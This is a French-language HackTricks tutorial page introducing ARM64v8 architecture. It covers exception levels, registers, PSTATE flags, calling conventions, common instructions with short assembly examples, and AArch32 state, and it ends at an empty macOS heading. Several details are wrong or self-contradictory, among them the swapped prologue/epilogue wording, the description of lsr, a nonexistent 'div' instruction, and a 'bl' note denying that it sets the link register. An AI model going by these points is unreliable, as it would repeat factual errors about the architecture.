# Introduction à ARM64v8

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## **Niveaux d'exception - EL (ARM64v8)**

Dans l'architecture ARMv8, les niveaux d'exécution, appelés niveaux d'exception (EL), définissent le niveau de privilège et les capacités de l'environnement d'exécution. Il existe quatre niveaux d'exception, allant de EL0 à EL3, chacun servant à un but différent :

1. **EL0 - Mode utilisateur** :
   - Il s'agit du niveau le moins privilégié et est utilisé pour exécuter du code d'application régulier.
   - Les applications s'exécutant à EL0 sont isolées les unes des autres et du logiciel système, améliorant ainsi la sécurité et la stabilité.
2. **EL1 - Mode noyau du système d'exploitation** :
   - La plupart des noyaux de systèmes d'exploitation s'exécutent à ce niveau.
   - EL1 a plus de privilèges que EL0 et peut accéder aux ressources système, mais avec certaines restrictions pour garantir l'intégrité du système.
3. **EL2 - Mode hyperviseur** :
   - Ce niveau est utilisé pour la virtualisation. Un hyperviseur s'exécutant à EL2 peut gérer plusieurs systèmes d'exploitation (chacun dans son propre EL1) s'exécutant sur le même matériel physique.
   - EL2 offre des fonctionnalités d'isolation et de contrôle des environnements virtualisés.
4. **EL3 - Mode moniteur sécurisé** :
   - Il s'agit du niveau le plus privilégié et est souvent utilisé pour le démarrage sécurisé et les environnements d'exécution de confiance.
   - EL3 peut gérer et contrôler les accès entre les états sécurisés et non sécurisés (comme le démarrage sécurisé, le système d'exploitation de confiance, etc.).

L'utilisation de ces niveaux permet de gérer de manière structurée et sécurisée différents aspects du système, des applications utilisateur au logiciel système le plus privilégié. L'approche des niveaux de privilège d'ARMv8 aide à isoler efficacement les différents composants du système, améliorant ainsi la sécurité et la robustesse du système.

## **Registres (ARM64v8)**

ARM64 dispose de **31 registres à usage général**, étiquetés `x0` à `x30`. Chacun peut stocker une valeur de **64 bits** (8 octets). Pour les opérations nécessitant uniquement des valeurs de 32 bits, les mêmes registres peuvent être accessibles en mode 32 bits en utilisant les noms w0 à w30.

1. **`x0`** à **`x7`** - Ceux-ci sont généralement utilisés comme registres temporaires et pour passer des paramètres aux sous-routines.
   - **`x0`** transporte également les données de retour d'une fonction.
2. **`x8`** - Dans le noyau Linux, `x8` est utilisé comme numéro d'appel système pour l'instruction `svc`. **Sur macOS, c'est x16 qui est utilisé !**
3. **`x9`** à **`x15`** - Plus de registres temporaires, souvent utilisés pour les variables locales.
4. **`x16`** et **`x17`** - **Registres d'appel intra-procédural**. Registres temporaires pour les valeurs immédiates. Ils sont également utilisés pour les appels de fonctions indirects et les ébauches de PLT (Table de liaison de procédure).
   - **`x16`** est utilisé comme **numéro d'appel système** pour l'instruction **`svc`** dans **macOS**.
5. **`x18`** - **Registre de plateforme**. Il peut être utilisé comme registre à usage général, mais sur certaines plateformes, ce registre est réservé à des utilisations spécifiques à la plateforme : Pointeur vers le bloc d'environnement de thread actuel dans Windows, ou pour pointer vers la structure de tâche actuellement **en cours d'exécution dans le noyau Linux**.
6. **`x19`** à **`x28`** - Ce sont des registres sauvegardés par l'appelé. Une fonction doit préserver les valeurs de ces registres pour son appelant, elles sont donc stockées dans la pile et récupérées avant de retourner à l'appelant.
7. **`x29`** - **Pointeur de cadre** pour suivre le cadre de la pile. Lorsqu'un nouveau cadre de pile est créé parce qu'une fonction est appelée, le registre **`x29`** est **stocké dans la pile** et l'adresse du **nouveau** pointeur de cadre (adresse de **`sp`**) est **stockée dans ce registre**.
   - Ce registre peut également être utilisé comme **registre à usage général** bien qu'il soit généralement utilisé comme référence aux **variables locales**.
8. **`x30`** ou **`lr`** - **Registre de lien**. Il contient l'**adresse de retour** lorsqu'une instruction `BL` (Branch with Link) ou `BLR` (Branch with Link to Register) est exécutée en stockant la valeur de **`pc`** dans ce registre.
   - Il peut également être utilisé comme n'importe quel autre registre.
   - Si la fonction actuelle va appeler une nouvelle fonction et donc écraser `lr`, elle le stockera dans la pile au début, c'est l'épilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stocker `fp` et `lr`, générer de l'espace et obtenir un nouveau `fp`) et le récupérera à la fin, c'est le prologue (`ldp x29, x30, [sp], #48; ret` -> Récupérer `fp` et `lr` et retourner).
9. **`sp`** - **Pointeur de pile**, utilisé pour suivre le sommet de la pile.
   - la valeur de **`sp`** doit toujours être maintenue à au moins un **alignement de quadri-mot** ou une exception d'alignement peut se produire.
10. **`pc`** - **Compteur de programme**, qui pointe vers l'instruction suivante. Ce registre ne peut être mis à jour que par des générations d'exceptions, des retours d'exceptions et des branches. Les seules instructions ordinaires qui peuvent lire ce registre sont les instructions de branchement avec lien (BL, BLR) pour stocker l'adresse de **`pc`** dans **`lr`** (Registre de lien).
11. **`xzr`** - **Registre zéro**. Aussi appelé **`wzr`** dans sa forme de registre **32** bits. Peut être utilisé pour obtenir facilement la valeur zéro (opération courante) ou pour effectuer des comparaisons en utilisant **`subs`** comme **`subs XZR, Xn, #10`** en stockant les données résultantes nulle part (dans **`xzr`**).

Les registres **`Wn`** sont la version **32 bits** du registre **`Xn`**.

### Registres SIMD et à virgule flottante

De plus, il existe **32 autres registres de longueur 128 bits** qui peuvent être utilisés dans des opérations optimisées de données multiples à instruction unique (SIMD) et pour effectuer des calculs en virgule flottante. Ceux-ci sont appelés les registres Vn bien qu'ils puissent également fonctionner en **64** bits, **32** bits, **16** bits et **8** bits, et sont alors appelés **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** et **`Bn`**.
### Registres système

**Il existe des centaines de registres système**, également appelés registres à usage spécial (SPR), qui sont utilisés pour **surveiller** et **contrôler** le **comportement des processeurs**.\
Ils ne peuvent être lus ou définis qu'en utilisant les instructions spéciales dédiées **`mrs`** et **`msr`**.

Les registres spéciaux **`TPIDR_EL0`** et **`TPIDDR_EL0`** sont couramment rencontrés lors de l'ingénierie inverse. Le suffixe `EL0` indique l'**exception minimale** à partir de laquelle le registre peut être accédé (dans ce cas, EL0 est le niveau d'exception (privilège) régulier avec lequel les programmes s'exécutent).\
Ils sont souvent utilisés pour stocker l'**adresse de base de la région de stockage locale du thread** en mémoire. Généralement, le premier est lisible et inscriptible pour les programmes s'exécutant en EL0, mais le second peut être lu depuis EL0 et écrit depuis EL1 (comme le noyau).

* `mrs x0, TPIDR_EL0 ; Lire TPIDR_EL0 dans x0`
* `msr TPIDR_EL0, X0 ; Écrire x0 dans TPIDR_EL0`

### **PSTATE**

**PSTATE** contient plusieurs composants de processus sérialisés dans le registre spécial **`SPSR_ELx`** visible par le système d'exploitation, X étant le **niveau de permission de l'exception déclenchée** (ce qui permet de récupérer l'état du processus lorsque l'exception se termine).\
Voici les champs accessibles :

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

* Les indicateurs de condition **`N`**, **`Z`**, **`C`** et **`V`** :
* **`N`** signifie que l'opération a donné un résultat négatif
* **`Z`** signifie que l'opération a donné zéro
* **`C`** signifie que l'opération a été effectuée
* **`V`** signifie que l'opération a donné un dépassement signé :
* La somme de deux nombres positifs donne un résultat négatif.
* La somme de deux nombres négatifs donne un résultat positif.
* En soustraction, lorsqu'un grand nombre négatif est soustrait d'un plus petit nombre positif (ou vice versa), et que le résultat ne peut pas être représenté dans la plage de la taille de bits donnée.
* Évidemment, le processeur ne sait pas si l'opération est signée ou non, il vérifiera donc C et V dans les opérations et indiquera si une retenue s'est produite dans le cas où elle était signée ou non signée.

{% hint style="warning" %}
Toutes les instructions ne mettent pas à jour ces indicateurs. Certaines comme **`CMP`** ou **`TST`** le font, et d'autres qui ont un suffixe s comme **`ADDS`** le font également.
{% endhint %}

* Le drapeau actuel de **largeur de registre (`nRW`)** : Si le drapeau a la valeur 0, le programme s'exécutera dans l'état d'exécution AArch64 une fois repris.
* Le **Niveau d'Exception actuel** (**`EL`**) : Un programme régulier s'exécutant en EL0 aura la valeur 0
* Le drapeau de **pas à pas unique** (**`SS`**) : Utilisé par les débogueurs pour effectuer un pas à pas en définissant le drapeau SS sur 1 à l'intérieur de **`SPSR_ELx`** via une exception. Le programme effectuera un pas et émettra une exception de pas à pas.
* Le drapeau d'état d'exception **illégal** (**`IL`**) : Il est utilisé pour marquer quand un logiciel privilégié effectue un transfert de niveau d'exception invalide, ce drapeau est défini sur 1 et le processeur déclenche une exception d'état illégal.
* Les drapeaux **`DAIF`** : Ces drapeaux permettent à un programme privilégié de masquer sélectivement certaines exceptions externes.
* Si **`A`** est à 1, cela signifie que des **abandons asynchrones** seront déclenchés. Le **`I`** configure la réponse aux **Demandes d'Interruptions** externes (IRQs). et le F est lié aux **Demandes d'Interruptions Rapides** (FIRs).
* Les drapeaux de sélection de pointeur de pile (**`SPS`**) : Les programmes privilégiés s'exécutant en EL1 et supérieur peuvent basculer entre l'utilisation de leur propre registre de pointeur de pile et celui du modèle utilisateur (par exemple, entre `SP_EL1` et `EL0`). Ce basculement est effectué en écrivant dans le registre spécial **`SPSel`**. Cela ne peut pas être fait depuis EL0.

## **Convention d'Appel (ARM64v8)**

La convention d'appel ARM64 spécifie que les **huit premiers paramètres** d'une fonction sont passés dans les registres **`x0` à `x7`**. Les **paramètres supplémentaires** sont passés sur la **pile**. La **valeur de retour** est renvoyée dans le registre **`x0`**, ou dans **`x1`** également **s'il fait 128 bits de long**. Les registres **`x19`** à **`x30`** et **`sp`** doivent être **conservés** entre les appels de fonction.

Lors de la lecture d'une fonction en langage d'assemblage, recherchez le **prologue et l'épilogue de la fonction**. Le **prologue** implique généralement **la sauvegarde du pointeur de cadre (`x29`)**, **la configuration** d'un **nouveau pointeur de cadre**, et **l'allocation d'espace de pile**. L'**épilogue** implique généralement **la restauration du pointeur de cadre sauvegardé** et **le retour** de la fonction.

### Convention d'Appel en Swift

Swift a sa propre **convention d'appel** qui peut être trouvée à l'adresse [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instructions Courantes (ARM64v8)**

Les instructions ARM64 ont généralement le **format `opcode dst, src1, src2`**, où **`opcode`** est l'**opération** à effectuer (comme `add`, `sub`, `mov`, etc.), **`dst`** est le **registre de destination** où le résultat sera stocké, et **`src1`** et **`src2`** sont les **registres source**. Des valeurs immédiates peuvent également être utilisées à la place des registres source.

* **`mov`** : **Déplacer** une valeur d'un **registre** à un autre.
* Exemple : `mov x0, x1` — Cela déplace la valeur de `x1` vers `x0`.
* **`ldr`** : **Charger** une valeur depuis la **mémoire** dans un **registre**.
* Exemple : `ldr x0, [x1]` — Cela charge une valeur depuis l'emplacement mémoire pointé par `x1` dans `x0`.
* **Mode de décalage** : Un décalage affectant le pointeur d'origine est indiqué, par exemple :
* `ldr x2, [x1, #8]`, cela chargera dans x2 la valeur de x1 + 8
* &#x20;`ldr x2, [x0, x1, lsl #2]`, cela chargera dans x2 un objet du tableau x0, à la position x1 (index) \* 4
* **Mode pré-indexé** : Cela appliquera des calculs à l'origine, obtiendra le résultat et stockera également la nouvelle origine dans l'origine.
* `ldr x2, [x1, #8]!`, cela chargera `x1 + 8` dans `x2` et stockera dans x1 le résultat de `x1 + 8`
* `str lr, [sp, #-4]!`, Stocke le registre de lien dans sp et met à jour le registre sp
* **Mode post-indexé** : C'est comme le précédent mais l'adresse mémoire est accédée, puis le décalage est calculé et stocké.
* `ldr x0, [x1], #8`, charge `x1` dans `x0` et met à jour x1 avec `x1 + 8`
* **Adressage relatif au PC** : Dans ce cas, l'adresse à charger est calculée par rapport au registre PC
* `ldr x1, =_start`, Cela chargera l'adresse où le symbole `_start` commence dans x1 par rapport au PC actuel.
* **`str`** : **Stocker** une valeur d'un **registre** dans la **mémoire**.
* Exemple : `str x0, [x1]` — Cela stocke la valeur dans `x0` dans l'emplacement mémoire pointé par `x1`.
* **`ldp`** : **Charger une Paire de Registres**. Cette instruction **charge deux registres** à partir de **emplacements mémoire** consécutifs. L'adresse mémoire est généralement formée en ajoutant un décalage à la valeur dans un autre registre.
* Exemple : `ldp x0, x1, [x2]` — Cela charge `x0` et `x1` depuis les emplacements mémoire à `x2` et `x2 + 8`, respectivement.
* **`stp`** : **Stocker une Paire de Registres**. Cette instruction **stocke deux registres** dans des **emplacements mémoire** consécutifs. L'adresse mémoire est généralement formée en ajoutant un décalage à la valeur dans un autre registre.
* Exemple : `stp x0, x1, [sp]` — Cela stocke `x0` et `x1` dans les emplacements mémoire à `sp` et `sp + 8`, respectivement.
* `stp x0, x1, [sp, #16]!` — Cela stocke `x0` et `x1` dans les emplacements mémoire à `sp+16` et `sp + 24`, respectivement, et met à jour `sp` avec `sp+16`.
* **`add`** : **Ajouter** les valeurs de deux registres et stocker le résultat dans un registre.
* Syntaxe : add(s) Xn1, Xn2, Xn3 | #imm, \[décalage #N | RRX\]
* Xn1 -> Destination
* Xn2 -> Opérande 1
* Xn3 | #imm -> Opérande 2 (registre ou immédiat)
* \[décalage #N | RRX\] -> Effectue un décalage ou appelle RRX
* Exemple : `add x0, x1, x2` — Cela ajoute les valeurs de `x1` et `x2` ensemble et stocke le résultat dans `x0`.
* `add x5, x5, #1, lsl #12` — Cela équivaut à 4096 (un 1 décalé de 12 fois) -> 1 0000 0000 0000 0000
* **`adds`** Cela effectue un `add` et met à jour les drapeaux
* **`sub`** : **Soustraire** les valeurs de deux registres et stocker le résultat dans un registre.
* Vérifier la **syntaxe de `add`**.
* Exemple : `sub x0, x1, x2` — Cela soustrait la valeur de `x2` de `x1` et stocke le résultat dans `x0`.
* **`subs`** C'est comme sub mais en mettant à jour le drapeau
* **`mul`** : **Multiplier** les valeurs de **deux registres** et stocker le résultat dans un registre.
* Exemple : `mul x0, x1, x2` — Cela multiplie les valeurs de `x1` et `x2` et stocke le résultat dans `x0`.
* **`div`** : **Diviser** la valeur d'un registre par un autre et stocker le résultat dans un registre.
* Exemple : `div x0, x1, x2` — Cela divise la valeur dans `x1` par `x2` et stocke le résultat dans `x0`.
* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`** :
* **Décalage logique à gauche** : Ajoute des 0 à partir de la fin en déplaçant les autres bits vers l'avant (multiplie par n fois 2)
* **Décalage logique à droite** : Ajoute des 1 au début en déplaçant les autres bits vers l'arrière (divise par n fois 2 en non signé)
* **Décalage arithmétique à droite** : Comme **`lsr`**, mais au lieu d'ajouter des 0 si le bit le plus significatif est un 1, \*\*1s sont ajoutés (\*\*divise par n fois 2 en signé)
* **Rotation à droite** : Comme **`lsr`** mais ce qui est supprimé à droite est ajouté à gauche
* **Rotation à droite avec extension** : Comme **`ror`**, mais avec le drapeau de retenue comme "bit le plus significatif". Ainsi, le drapeau de retenue est déplacé vers le bit 31 et le bit supprimé vers le drapeau de retenue.
* **`bfm`** : **Déplacement de champ de bits**, ces opérations **copient les bits `0...n`** d'une valeur et les placent dans les positions **`m..m+n`**. Le **`#s`** spécifie la position du **bit le plus à gauche** et **`#r`** la **quantité de rotation à droite**.
* Déplacement de champ de bits : `BFM Xd, Xn, #r`
* Déplacement de champ de bits signé : `SBFM Xd, Xn, #r, #s`
* Déplacement de champ de bits non signé : `UBFM Xd, Xn, #r, #s`
* **Extraction et insertion de champ de bits :** Copie un champ de bits d'un registre et le copie dans un autre registre.
* **`BFI X1, X2, #3, #4`** Insère 4 bits de X2 à partir du 3e bit de X1
* **`BFXIL X1, X2, #3, #4`** Extrait à partir du 3e bit de X2 quatre bits et les copie dans X1
* **`SBFIZ X1, X2, #3, #4`** Étend le signe de 4 bits de X2 et les insère dans X1 à partir de la position du bit 3 en mettant à zéro les bits de droite
* **`SBFX X1, X2, #3, #4`** Extrait 4 bits à partir du bit 3 de X2, étend le signe, et place le résultat dans X1
* **`UBFIZ X1, X2, #3, #4`** Étend à zéro 4 bits de X2 et les insère dans X1 à partir de la position du bit 3 en mettant à zéro les bits de droite
* **`UBFX X1, X2, #3, #4`** Extrait 4 bits à partir du bit 3 de X2 et place le résultat étendu à zéro dans X1.
* **Étendre le signe à X :** Étend le signe (ou ajoute simplement des 0 dans la version non signée) d'une valeur pour pouvoir effectuer des opérations avec elle :
* **`SXTB X1, W2`** Étend le signe d'un octet **de W2 à X1** (`W2` est la moitié de `X2`) pour remplir les 64 bits
* **`SXTH X1, W2`** Étend le signe d'un nombre de 16 bits **de W2 à X1** pour remplir les 64 bits
* **`SXTW X1, W2`** Étend le signe d'un octet **de W2 à X1** pour remplir les 64 bits
* **`UXTB X1, W2`** Ajoute des 0 (non signé) à un octet **de W2 à X1** pour remplir les 64 bits
* **`extr` :** Extrait des bits d'une **paire de registres concaténés** spécifiée.
* Exemple : `EXTR W3, W2, W1, #3` Cela **concatène W1+W2** et obtient **du bit 3 de W2 jusqu'au bit 3 de W1** et le stocke dans W3.
* **`cmp`** : **Comparer** deux registres et définir les drapeaux de condition. C'est un **alias de `subs`** en définissant le registre de destination sur le registre zéro. Utile pour savoir si `m == n`.
* Il prend en charge la **même syntaxe que `subs`**
* Exemple : `cmp x0, x1` — Cela compare les valeurs dans `x0` et `x1` et définit les drapeaux de condition en conséquence.
* **`cmn`** : **Comparer l'opposé négatif**. Dans ce cas, c'est un **alias de `adds`** et prend en charge la même syntaxe. Utile pour savoir si `m == -n`.
* **`ccmp`** : Comparaison conditionnelle, c'est une comparaison qui sera effectuée uniquement si une comparaison précédente était vraie et définira spécifiquement les bits nzcv.
* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 et x3 < x4, sauter à func
* Cela est dû au fait que **`ccmp`** ne sera exécuté que si le **précédent `cmp` était un `NE`**, sinon les bits `nzcv` seront définis à 0 (ce qui ne satisfera pas la comparaison `blt`).
* Cela peut également être utilisé comme `ccmn` (pareil mais négatif, comme `cmp` vs `cmn`).
* **`tst`** : Il vérifie si l'une des valeurs de la comparaison est à la fois 1 (il fonctionne comme un ANDS sans stocker le résultat n'importe où). Utile pour vérifier un registre avec une valeur et vérifier si l'un des bits du registre indiqué dans la valeur est à 1.
* Exemple : `tst X1, #7` Vérifie si l'un des 3 derniers bits de X1 est à 1
* **`teq`** : Opération XOR en ignorant le résultat
* **`b`** : Branchement inconditionnel
* Exemple : `b myFunction`&#x20;
* Notez que cela ne remplira pas le registre de lien avec l'adresse de retour (pas adapté pour les appels de sous-routine qui doivent revenir en arrière)
* **`bl`** : **Branchement** avec lien, utilisé pour **appeler** une **sous-routine**. Stocke l'**adresse de retour dans `x30`**.
* Exemple : `bl myFunction` — Cela appelle la fonction `myFunction` et stocke l'adresse de retour dans `x30`.
* Notez que cela ne remplira pas le registre de lien avec l'adresse de retour (pas adapté pour les appels de sous-routine qui doivent revenir en arrière)
* **`blr`** : **Branchement** avec lien vers un registre, utilisé pour **appeler** une **sous-routine** où la cible est **spécifiée** dans un **registre**. Stocke l'adresse de retour dans `x30`. (Ceci est&#x20;
* Exemple : `blr x1` — Cela appelle la fonction dont l'adresse est contenue dans `x1` et stocke l'adresse de retour dans `x30`.
* **`ret`** : **Retour** de **sous-routine**, en utilisant généralement l'adresse dans **`x30`**.
* Exemple : `ret` — Cela retourne de la sous-routine actuelle en utilisant l'adresse de retour dans `x30`.
* **`b.<cond>`** : Branchement conditionnel
* **`b.eq`** : **Brancher si égal**, basé sur l'instruction `cmp` précédente.
* Exemple : `b.eq label` — Si l'instruction `cmp` précédente a trouvé deux valeurs égales, cela saute à `label`.
* **`b.ne`**: **Branch if Not Equal**. Cette instruction vérifie les indicateurs de condition (qui ont été définis par une instruction de comparaison précédente), et si les valeurs comparées ne sont pas égales, elle saute vers une étiquette ou une adresse.
* Exemple : Après une instruction `cmp x0, x1`, `b.ne label` — Si les valeurs dans `x0` et `x1` ne sont pas égales, cela saute à `label`.
* **`cbz`**: **Comparer et Sauter si Zéro**. Cette instruction compare un registre avec zéro, et s'ils sont égaux, elle saute vers une étiquette ou une adresse.
* Exemple : `cbz x0, label` — Si la valeur dans `x0` est zéro, cela saute à `label`.
* **`cbnz`**: **Comparer et Sauter si Non-Zéro**. Cette instruction compare un registre avec zéro, et s'ils ne sont pas égaux, elle saute vers une étiquette ou une adresse.
* Exemple : `cbnz x0, label` — Si la valeur dans `x0` est non nulle, cela saute à `label`.
* **`tbnz`**: Tester le bit et sauter si non nul
* Exemple : `tbnz x0, #8, label`
* **`tbz`**: Tester le bit et sauter si zéro
* Exemple : `tbz x0, #8, label`
* **Opérations de sélection conditionnelle** : Ce sont des opérations dont le comportement varie en fonction des bits conditionnels.
* `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si vrai, X0 = X1, si faux, X0 = X2
* `csinc Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, si faux, Xd = Xm + 1
* `cinc Xd, Xn, cond` -> Si vrai, Xd = Xn + 1, si faux, Xd = Xn
* `csinv Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, si faux, Xd = NON(Xm)
* `cinv Xd, Xn, cond` -> Si vrai, Xd = NON(Xn), si faux, Xd = Xn
* `csneg Xd, Xn, Xm, cond` -> Si vrai, Xd = Xn, si faux, Xd = - Xm
* `cneg Xd, Xn, cond` -> Si vrai, Xd = - Xn, si faux, Xd = Xn
* `cset Xd, Xn, Xm, cond` -> Si vrai, Xd = 1, si faux, Xd = 0
* `csetm Xd, Xn, Xm, cond` -> Si vrai, Xd = \<tout 1>, si faux, Xd = 0
* **`adrp`**: Calculer l'**adresse de page d'un symbole** et la stocker dans un registre.
* Exemple : `adrp x0, symbol` — Cela calcule l'adresse de page de `symbol` et la stocke dans `x0`.
* **`ldrsw`**: **Charger** une valeur signée **32 bits** depuis la mémoire et la **étendre à 64 bits**.
* Exemple : `ldrsw x0, [x1]` — Cela charge une valeur signée sur 32 bits depuis l'emplacement mémoire pointé par `x1`, l'étend à 64 bits, et la stocke dans `x0`.
* **`stur`**: **Stocker une valeur de registre dans un emplacement mémoire**, en utilisant un décalage par rapport à un autre registre.
* Exemple : `stur x0, [x1, #4]` — Cela stocke la valeur dans `x0` dans l'adresse mémoire qui est 4 octets plus grande que l'adresse actuellement dans `x1`.
* **`svc`** : Faire un **appel système**. Cela signifie "Supervisor Call". Lorsque le processeur exécute cette instruction, il **passe du mode utilisateur au mode noyau** et saute à un emplacement spécifique en mémoire où se trouve le code de gestion des **appels système du noyau**.
*   Exemple:

```armasm
mov x8, 93  ; Charger le numéro d'appel système pour exit (93) dans le registre x8.
mov x0, 0   ; Charger le code d'état de sortie (0) dans le registre x0.
svc 0       ; Faire l'appel système.
```

### **Prologue de fonction**

1. **Sauvegarder le registre de lien et le pointeur de cadre dans la pile**:

{% code overflow="wrap" %}
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
{% endcode %}

2. **Configurer le nouveau pointeur de cadre**: `mov x29, sp` (configure le nouveau pointeur de cadre pour la fonction actuelle)
3. **Allouer de l'espace sur la pile pour les variables locales** (si nécessaire): `sub sp, sp, <size>` (où `<size>` est le nombre d'octets nécessaires)

### **Épilogue de la fonction**

1. **Désallouer les variables locales (si des variables ont été allouées)**: `add sp, sp, <size>`
2. **Restaurer le registre de lien et le pointeur de cadre**:

{% code overflow="wrap" %}
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **Retour**: `ret` (renvoie le contrôle à l'appelant en utilisant l'adresse dans le registre de lien)

## État d'exécution AARCH32

Armv8-A prend en charge l'exécution de programmes 32 bits. **AArch32** peut s'exécuter dans l'un des **deux jeux d'instructions** : **`A32`** et **`T32`** et peut basculer entre eux via **`l'interfonctionnement`**.\
Les programmes 64 bits **privilégiés** peuvent planifier l'**exécution de programmes 32 bits** en effectuant un transfert de niveau d'exception vers le 32 bits moins privilégié.\
Notez que la transition de 64 bits à 32 bits se produit avec une baisse du niveau d'exception (par exemple, un programme 64 bits en EL1 déclenchant un programme en EL0). Cela est fait en définissant le **bit 4 de** **`SPSR_ELx`** registre spécial **à 1** lorsque le processus de thread `AArch32` est prêt à être exécuté et le reste de `SPSR_ELx` stocke les programmes **`AArch32`** CPSR. Ensuite, le processus privilégié appelle l'instruction **`ERET`** pour que le processeur passe en mode **`AArch32`** en entrant en A32 ou T32 en fonction de CPSR\*\*.\*\*

L'**`interfonctionnement`** se produit en utilisant les bits J et T de CPSR. `J=0` et `T=0` signifie **`A32`** et `J=0` et `T=1` signifie **T32**. Cela se traduit essentiellement par le réglage du **bit le plus bas à 1** pour indiquer que le jeu d'instructions est T32.\
Cela est défini pendant les **instructions de branchement d'interfonctionnement,** mais peut également être défini directement avec d'autres instructions lorsque le PC est défini comme le registre de destination. Exemple :

Un autre exemple:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registres

Il y a 16 registres de 32 bits (r0-r15). De r0 à r14, ils peuvent être utilisés pour toute opération, cependant certains sont généralement réservés :

- `r15` : Compteur de programme (toujours). Contient l'adresse de l'instruction suivante. En A32, actuel + 8, en T32, actuel + 4.
- `r11` : Pointeur de cadre
- `r12` : Registre d'appel intra-procédural
- `r13` : Pointeur de pile
- `r14` : Registre de lien

De plus, les registres sont sauvegardés dans des **registres bancaires**. Ce sont des emplacements qui stockent les valeurs des registres permettant d'effectuer une **commutation de contexte rapide** dans la gestion des exceptions et des opérations privilégiées pour éviter de devoir sauvegarder et restaurer manuellement les registres à chaque fois. Cela est réalisé en **sauvegardant l'état du processeur du `CPSR` dans le `SPSR`** du mode processeur vers lequel l'exception est prise. Lors du retour de l'exception, le **`CPSR`** est restauré à partir du **`SPSR`**.

### CPSR - Registre d'état de programme actuel

En AArch32, le CPSR fonctionne de manière similaire à **`PSTATE`** en AArch64 et est également stocké dans **`SPSR_ELx`** lorsqu'une exception est prise pour restaurer ultérieurement l'exécution :

<figure><img src="../../../.gitbook/assets/image (725).png" alt=""><figcaption></figcaption></figure>

Les champs sont divisés en quelques groupes :

- Registre d'état de programme d'application (APSR) : Drapeaux arithmétiques et accessibles depuis EL0
- Registres d'état d'exécution : Comportement du processus (géré par le système d'exploitation).

#### Registre d'état de programme d'application (APSR)

- Les drapeaux **`N`**, **`Z`**, **`C`**, **`V`** (tout comme en AArch64)
- Le drapeau **`Q`** : Il est défini à 1 chaque fois qu'une **saturation entière se produit** pendant l'exécution d'une instruction arithmétique de saturation spécialisée. Une fois défini à **`1`**, il conservera la valeur jusqu'à ce qu'il soit défini manuellement à 0. De plus, il n'y a pas d'instruction qui vérifie sa valeur implicitement, cela doit être fait en le lisant manuellement.
- Drapeaux **`GE`** (Supérieur ou égal) : Ils sont utilisés dans les opérations SIMD (Single Instruction, Multiple Data), telles que "addition parallèle" et "soustraction parallèle". Ces opérations permettent de traiter plusieurs points de données dans une seule instruction.

Par exemple, l'instruction **`UADD8`** **ajoute quatre paires d'octets** (à partir de deux opérandes de 32 bits) en parallèle et stocke les résultats dans un registre de 32 bits. Ensuite, elle **définit les drapeaux `GE` dans l'`APSR`** en fonction de ces résultats. Chaque drapeau GE correspond à une des additions d'octets, indiquant si l'addition pour cette paire d'octets a **débordé**.

L'instruction **`SEL`** utilise ces drapeaux GE pour effectuer des actions conditionnelles.

#### Registres d'état d'exécution

- Les bits **`J`** et **`T`** : **`J`** doit être 0 et si **`T`** est 0, l'ensemble d'instructions A32 est utilisé, et s'il est à 1, le T32 est utilisé.
- Registre d'état de bloc IT (`ITSTATE`) : Ce sont les bits de 10 à 15 et de 25 à 26. Ils stockent les conditions pour les instructions à l'intérieur d'un groupe préfixé par **`IT`**.
- Bit **`E`** : Indique l'**endianness**.
- Bits de mode et de masque d'exception (0-4) : Ils déterminent l'état d'exécution actuel. Le cinquième indique si le programme s'exécute en 32 bits (un 1) ou en 64 bits (un 0). Les quatre autres représentent le **mode d'exception actuellement utilisé** (lorsqu'une exception se produit et qu'elle est en cours de traitement). Le nombre défini indique la priorité actuelle en cas de déclenchement d'une autre exception pendant le traitement de celle-ci.

<figure><img src="../../../.gitbook/assets/image (728).png" alt=""><figcaption></figcaption></figure>

- **`AIF`** : Certaines exceptions peuvent être désactivées en utilisant les bits **`A`**, `I`, `F`. Si **`A`** est à 1, cela signifie que des **abandons asynchrones** seront déclenchés. Le **`I`** configure la réponse aux **demandes d'interruption matérielles externes** (IRQ). et le F est lié aux **demandes d'interruption rapide** (FIR).

## macOS

### Appels système BSD

Consultez [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Les appels système BSD auront **x16 > 0**.

### Pièges Mach

